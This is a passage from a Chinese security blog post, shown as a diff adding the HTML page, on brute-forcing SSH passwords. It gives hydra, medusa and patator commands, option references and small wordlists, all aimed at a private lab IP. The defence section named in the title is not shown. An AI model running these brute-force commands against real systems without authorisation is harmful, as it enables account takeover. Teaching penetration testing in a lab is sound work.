@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="ZsntNucQnwgOG8NJsPVjhDxi8hx9YmTvgqa9eReuux0">
+
+
+
+  <meta name="msvalidate.01" content="A3C088EA1884107284C9F5B94B1C667F">
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="rLNDlRl5mo">
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/avatar.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="hydra[海德拉]1hydra 是世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。">
+<meta name="keywords" content="Python | CTF | SEC | 笔记 | 加密 | writeup | 小维同学 | 网络安全 | 博客">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSH密码暴力破解及防御实战">
+<meta property="og:url" content="https://axiaowei.cn/2019/06/19/201948/index.html">
+<meta property="og:site_name" content="小维的博客">
+<meta property="og:description" content="hydra[海德拉]1hydra 是世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dilpoikyj30jj093aou.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2djm3yktxj30s80cu41u.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2djm3yktxj30s80cu41u.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dkeuxkdoj30rh07dad7.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dkjxodq9j30s80d5774.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dknvvwg2j30s80mkdnw.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dkvxgld5j30sp0k5gtv.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dkzuvtjrj30s609z77f.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dlfy0pplj30sp0jy78a.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dllioyabj30sa0eq0we.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dllyauypj30sp0gxgrt.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dllyauypj30sp0gxgrt.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dlxc12qej30sp0gxq81.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dqcflaolj30s804fgmz.jpg">
+<meta property="og:updated_time" content="2019-06-19T05:10:39.091Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSH密码暴力破解及防御实战">
+<meta name="twitter:description" content="hydra[海德拉]1hydra 是世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dilpoikyj30jj093aou.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":10,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://axiaowei.cn/2019/06/19/201948/">
+
+
+
+
+
+  <title>SSH密码暴力破解及防御实战 | 小维的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">小维的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Python | CTF | Writeup | Note</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://axiaowei.cn/2019/06/19/201948/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小维同学">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小维的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SSH密码暴力破解及防御实战</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-19T13:10:12+08:00">
+                2019-06-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,505字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="hydra-海德拉"><a href="#hydra-海德拉" class="headerlink" title="hydra[海德拉]"></a>hydra[海德拉]</h4><p><img src="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dilpoikyj30jj093aou.jpg" alt=""><br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span> 是世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<h5 id="指定用户破解"><a href="#指定用户破解" class="headerlink" title="指定用户破解"></a>指定用户破解</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Examples</span>:</span><br><span class="line">  hydra -l user -P passlist.txt <span class="attribute">ftp</span>:<span class="comment">//192.168.0.1</span></span><br><span class="line">  hydra -L userlist.txt -p defaultpw <span class="attribute">imap</span>:<span class="comment">//192.168.0.1/PLAIN</span></span><br><span class="line">  hydra -C defaults.txt -<span class="number">6</span> <span class="attribute">pop3s</span>:<span class="comment">//[2001:db8::1]:143/TLS:DIGEST-MD5</span></span><br><span class="line">  hydra -l admin -p password <span class="attribute">ftp</span>:<span class="comment">//[192.168.0.0/24]/</span></span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span>:~# hydra -l root -P passlist.txt <span class="number">192.168</span>.<span class="number">203.48</span> ssh</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/007JdRFxgy1g2djm3yktxj30s80cu41u.jpg" alt=""></p>
+<h5 id="用户列表破解"><a href="#用户列表破解" class="headerlink" title="用户列表破解"></a>用户列表破解</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat userlist.txt </span><br><span class="line">user</span><br><span class="line">admin</span><br><span class="line">zhuzhuxia</span><br><span class="line">deng</span><br><span class="line">chen</span><br><span class="line">xiaowei</span><br><span class="line">root</span><br><span class="line">aclie</span><br><span class="line">jack</span><br><span class="line">root@kali:~# cat passlist.txt </span><br><span class="line">1234567</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">redhat</span><br><span class="line">dengxin</span><br><span class="line">user</span><br><span class="line">qwer1234</span><br><span class="line">qwert</span><br><span class="line">hahah</span><br><span class="line">2333</span><br><span class="line">toor</span><br><span class="line"></span><br><span class="line">root@kali:~# hydra -L userlist.txt -P passlist.txt 192.168.203.48 ssh</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/007JdRFxgy1g2djm3yktxj30s80cu41u.jpg" alt=""><br><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">常用参数：</span><br><span class="line"><span class="deletion">-R 继续从上一次进度接着破解。</span></span><br><span class="line"><span class="deletion">-S 采用SSL链接。</span></span><br><span class="line"><span class="deletion">-s PORT 可通过这个参数指定非默认端口。</span></span><br><span class="line"><span class="deletion">-l LOGIN 指定破解的用户，对特定用户破解。</span></span><br><span class="line"><span class="deletion">-L FILE 指定用户名字典。</span></span><br><span class="line"><span class="deletion">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span></span><br><span class="line"><span class="deletion">-P FILE 大写，指定密码字典。</span></span><br><span class="line"><span class="deletion">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span></span><br><span class="line"><span class="deletion">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span></span><br><span class="line"><span class="deletion">-M FILE 指定目标列表文件一行一条。</span></span><br><span class="line"><span class="deletion">-o FILE 指定结果输出文件。</span></span><br><span class="line"><span class="deletion">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span></span><br><span class="line"><span class="deletion">-t TASKS 同时运行的线程数，默认为16。</span></span><br><span class="line"><span class="deletion">-w TIME 设置最大超时的时间，单位秒，默认是30s。</span></span><br><span class="line"><span class="deletion">-v / -V 显示详细过程。</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="Medusa-美杜莎"><a href="#Medusa-美杜莎" class="headerlink" title="Medusa[美杜莎]"></a>Medusa[美杜莎]</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Medusa（美杜莎）是一个速度快，支持大规模并行，模块化，爆破登录。可以同时对多个主机，用户或密码执行强力测试。Medusa和hydra一样，同样属于在线密码破解工具。不同是，medusa的稳定性相较于hydra要好很多，但其支持的模块要比hydra少一些。</span><br></pre></td></tr></table></figure>
+<h5 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h5><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Medusa [-h host|-H <span class="keyword">file</span>] [-u username|-U <span class="keyword">file</span>] [-p password|-P <span class="keyword">file</span>] [-C <span class="keyword">file</span>] -M module [OPT]</span><br><span class="line">  -h [<span class="literal">TEXT</span>]    : Target hostname <span class="keyword">or</span> IP address //目标主机名称或者IP地址</span><br><span class="line">  -H [<span class="keyword">FILE</span>]    : <span class="keyword">File</span> containing target hostnames <span class="keyword">or</span> IP addresses //包含目标主机名或者IP地址文件</span><br><span class="line">  -u [<span class="literal">TEXT</span>]    : Username <span class="keyword">to</span> test  //测试用户名</span><br><span class="line">  -U [<span class="keyword">FILE</span>]    : <span class="keyword">File</span> containing usernames <span class="keyword">to</span> test //包含测试的用户名文件</span><br><span class="line">  -p [<span class="literal">TEXT</span>]    : Password <span class="keyword">to</span> test  //测试密码</span><br><span class="line">  -P [<span class="keyword">FILE</span>]    : <span class="keyword">File</span> containing passwords <span class="keyword">to</span> test  //包含测试的密码文件</span><br><span class="line">  -C [<span class="keyword">FILE</span>]    : <span class="keyword">File</span> containing combo entries. See README <span class="keyword">for</span> more information.  //组合条目文件</span><br><span class="line">  -O [<span class="keyword">FILE</span>]    : <span class="keyword">File</span> <span class="keyword">to</span> append log information <span class="keyword">to</span> //日志信息文件</span><br><span class="line">  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)  //n代表空密码，s代表为密码与用户名相同</span><br><span class="line">  -M [<span class="literal">TEXT</span>]    : Name <span class="keyword">of</span> the module <span class="keyword">to</span> execute (without the .<span class="keyword">mod</span> extension)  //模块执行名称</span><br><span class="line">  -m [<span class="literal">TEXT</span>]    : <span class="keyword">Parameter</span> <span class="keyword">to</span> pass <span class="keyword">to</span> the module. This can be passed multiple times <span class="keyword">with</span> a</span><br><span class="line">                 different <span class="keyword">parameter</span> each <span class="built_in">time</span> <span class="keyword">and</span> they will <span class="keyword">all</span> be sent <span class="keyword">to</span> the module (i.e.</span><br><span class="line">                 -m Param1 -m Param2, etc.)  //传递参数到模块</span><br><span class="line">  -d           : Dump <span class="keyword">all</span> known modules  //显示所有的模块名称</span><br><span class="line">  -n [NUM]     : <span class="keyword">Use</span> <span class="keyword">for</span> non-<span class="keyword">default</span> TCP <span class="keyword">port</span> number  //使用非默认的TCP端口</span><br><span class="line">  -s           : Enable SSL  //启动SSL</span><br><span class="line">  -g [NUM]     : Give up <span class="keyword">after</span> trying <span class="keyword">to</span> connect <span class="keyword">for</span> NUM seconds (<span class="keyword">default</span> <span class="number">3</span>)</span><br><span class="line">  -r [NUM]     : Sleep NUM seconds between retry attempts (<span class="keyword">default</span> <span class="number">3</span>)  //重试间隔时间</span><br><span class="line">  -R [NUM]     : Attempt NUM retries before giving up. The total number <span class="keyword">of</span> attempts will be NUM + <span class="number">1</span>.</span><br><span class="line">  -c [NUM]     : <span class="built_in">Time</span> <span class="keyword">to</span> <span class="keyword">wait</span> <span class="keyword">in</span> usec <span class="keyword">to</span> verify socket <span class="keyword">is</span> available (<span class="keyword">default</span> <span class="number">500</span> usec).</span><br><span class="line">  -t [NUM]     : Total number <span class="keyword">of</span> logins <span class="keyword">to</span> be tested concurrently  //设定线程数量</span><br><span class="line">  -T [NUM]     : Total number <span class="keyword">of</span> hosts <span class="keyword">to</span> be tested concurrently  //同时测试的主机总数</span><br><span class="line">  -L           : Parallelize logins using one username per thread. The <span class="keyword">default</span> <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">process</span>  </span><br><span class="line">                 the entire username before proceeding.  //并行化，每一个用户使用一个线程 </span><br><span class="line">  -f           : Stop scanning host <span class="keyword">after</span> first valid username/password found.  //在任何主机上找到第一个账号/密码后，停止破解</span><br><span class="line">  -F           : Stop audit <span class="keyword">after</span> first valid username/password found <span class="keyword">on</span> any host.  //在任何主机找到第一个有效的用户名/密码停止审计</span><br><span class="line">  -b           : Suppress startup banner</span><br><span class="line">  -q           : Display module<span class="symbol">'s</span> usage information  //显示模块的使用信息</span><br><span class="line">  -v [NUM]     : Verbose level [<span class="number">0</span> - <span class="number">6</span> (more)]  //详细级别(<span class="number">0</span>-<span class="number">6</span>)</span><br><span class="line">  -w [NUM]     : <span class="literal">Error</span> debug level [<span class="number">0</span> - <span class="number">10</span> (more)]  //错误调式级别(<span class="number">0</span>-<span class="number">10</span>)</span><br><span class="line">  -V           : Display version  //显示版本</span><br><span class="line">  -Z [<span class="literal">TEXT</span>]    : Resume scan based <span class="keyword">on</span> <span class="keyword">map</span> <span class="keyword">of</span> previous scan  //继续扫描上一次</span><br></pre></td></tr></table></figure>
+<h5 id="破解SSH密码"><a href="#破解SSH密码" class="headerlink" title="破解SSH密码"></a>破解SSH密码</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># medusa -M ssh -u root -P passlist.txt -h 192.168.203.48</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dkeuxkdoj30rh07dad7.jpg" alt=""></p>
+<h4 id="patator"><a href="#patator" class="headerlink" title="patator"></a>patator</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Patator</span> 强大的命令行暴力破解器</span><br></pre></td></tr></table></figure>
+<h5 id="可用模块"><a href="#可用模块" class="headerlink" title="可用模块"></a>可用模块</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">root</span>@<span class="selector-tag">kali</span>:~# <span class="selector-tag">patator</span> <span class="selector-tag">-h</span></span><br><span class="line"><span class="selector-tag">Patator</span> <span class="selector-tag">v0</span><span class="selector-class">.7</span> (<span class="attribute">https</span>:<span class="comment">//github.com/lanjelot/patator)</span></span><br><span class="line"><span class="attribute">Usage</span>: patator module --help</span><br><span class="line"></span><br><span class="line">Available <span class="attribute">modules</span>:</span><br><span class="line">  + <span class="attribute">ftp_login     </span>: Brute-force FTP</span><br><span class="line">  + <span class="attribute">ssh_login     </span>: Brute-force SSH</span><br><span class="line">  + <span class="attribute">telnet_login  </span>: Brute-force Telnet</span><br><span class="line">  + <span class="attribute">smtp_login    </span>: Brute-force SMTP</span><br><span class="line">  + <span class="attribute">smtp_vrfy     </span>: Enumerate valid users using SMTP VRFY</span><br><span class="line">  + <span class="attribute">smtp_rcpt     </span>: Enumerate valid users using SMTP RCPT TO</span><br><span class="line">  + <span class="attribute">finger_lookup </span>: Enumerate valid users using Finger</span><br><span class="line">  + <span class="attribute">http_fuzz     </span>: Brute-force HTTP</span><br><span class="line">  + <span class="attribute">ajp_fuzz      </span>: Brute-force AJP</span><br><span class="line">  + <span class="attribute">pop_login     </span>: Brute-force POP3</span><br><span class="line">  + <span class="attribute">pop_passd     </span>: Brute-force poppassd (<span class="attribute">http</span>:<span class="comment">//netwinsite.com/poppassd/)</span></span><br><span class="line">  + <span class="attribute">imap_login    </span>: Brute-force IMAP4</span><br><span class="line">  + <span class="attribute">ldap_login    </span>: Brute-force LDAP</span><br><span class="line">  + <span class="attribute">smb_login     </span>: Brute-force SMB</span><br><span class="line">  + <span class="attribute">smb_lookupsid </span>: Brute-force SMB SID-lookup</span><br><span class="line">  + <span class="attribute">rlogin_login  </span>: Brute-force rlogin</span><br><span class="line">  + <span class="attribute">vmauthd_login </span>: Brute-force VMware Authentication Daemon</span><br><span class="line">  + <span class="attribute">mssql_login   </span>: Brute-force MSSQL</span><br><span class="line">  + <span class="attribute">oracle_login  </span>: Brute-force Oracle</span><br><span class="line">  + <span class="attribute">mysql_login   </span>: Brute-force MySQL</span><br><span class="line">  + <span class="attribute">mysql_query   </span>: Brute-force MySQL queries</span><br><span class="line">  + <span class="attribute">rdp_login     </span>: Brute-force RDP (NLA)</span><br><span class="line">  + <span class="attribute">pgsql_login   </span>: Brute-force PostgreSQL</span><br><span class="line">  + <span class="attribute">vnc_login     </span>: Brute-force VNC</span><br><span class="line">  + <span class="attribute">dns_forward   </span>: Forward DNS lookup</span><br><span class="line">  + <span class="attribute">dns_reverse   </span>: Reverse DNS lookup</span><br><span class="line">  + <span class="attribute">snmp_login    </span>: Brute-force SNMP v1/<span class="number">2</span>/<span class="number">3</span></span><br><span class="line">  + <span class="attribute">ike_enum      </span>: Enumerate IKE transforms</span><br><span class="line">  + <span class="attribute">unzip_pass    </span>: Brute-force the password of encrypted ZIP files</span><br><span class="line">  + <span class="attribute">keystore_pass </span>: Brute-force the password of Java keystore files</span><br><span class="line">  + <span class="attribute">sqlcipher_pass </span>: Brute-force the password of SQLCipher-encrypted databases</span><br><span class="line">  + <span class="attribute">umbraco_crack </span>: Crack Umbraco HMAC-SHA1 password hashes</span><br><span class="line">  + <span class="attribute">tcp_fuzz      </span>: Fuzz TCP services</span><br><span class="line">  + <span class="attribute">dummy_test    </span>: Testing module</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dkjxodq9j30s80d5774.jpg" alt=""></p>
+<h5 id="破解SSH密码-1"><a href="#破解SSH密码-1" class="headerlink" title="破解SSH密码"></a>破解SSH密码</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">root</span>@<span class="selector-tag">kali</span>:~# <span class="selector-tag">patator</span> <span class="selector-tag">ssh_login</span> <span class="selector-tag">--help</span></span><br><span class="line"><span class="selector-tag">Patator</span> <span class="selector-tag">v0</span><span class="selector-class">.7</span> (<span class="attribute">https</span>:<span class="comment">//github.com/lanjelot/patator)</span></span><br><span class="line"><span class="attribute">Usage</span>: ssh_login &lt;module-options ...&gt; [global-options ...]</span><br><span class="line"></span><br><span class="line"><span class="attribute">Examples</span>:</span><br><span class="line">  ssh_login host=<span class="number">10.0</span>.<span class="number">0.1</span> user=root password=FILE0 <span class="number">0</span>=passwords.txt -x <span class="attribute">ignore</span>:mesg=<span class="string">'Authentication failed.'</span></span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span>:~# patator ssh_login host=<span class="number">192.168</span>.<span class="number">203.48</span> user=root password=FILE0 <span class="number">0</span>=passlist.txt</span><br><span class="line">root<span class="variable">@kali</span>:~# patator ssh_login host=<span class="number">192.168</span>.<span class="number">203.48</span> user=FILE0 <span class="number">0</span>=userlist.txt password=FILE1 <span class="number">1</span>=passlist.txt -x <span class="attribute">ignore</span>:mesg=<span class="string">'Authentication failed.'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dknvvwg2j30s80mkdnw.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/007JdRFxgy1g2dkvxgld5j30sp0k5gtv.jpg" alt=""></p>
+<h4 id="BrutesPray"><a href="#BrutesPray" class="headerlink" title="BrutesPray"></a>BrutesPray</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BruteSpray </span>是一款基于nmap扫描输出的gnmap/XML文件</span><br><span class="line">自动调用Medusa对服务进行爆破（Medusa美杜莎 是一个爆破工具，速度比Hydra九头蛇快）</span><br></pre></td></tr></table></figure>
